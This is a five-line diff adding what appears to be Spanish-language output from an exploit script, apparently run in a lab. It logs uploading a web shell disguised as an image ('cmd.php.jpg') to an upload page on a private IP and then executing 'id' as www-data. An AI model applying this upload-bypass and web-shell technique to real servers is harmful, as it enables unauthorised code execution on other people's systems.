@@ -1,0 +1,5 @@
+[*] Subiendo cmd.php.jpg a http://172.17.0.2/upload.php
+alert alert-success">File uploaded successfully: cmd.php.jpg
+
+[*] Prueba de ejecución: id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
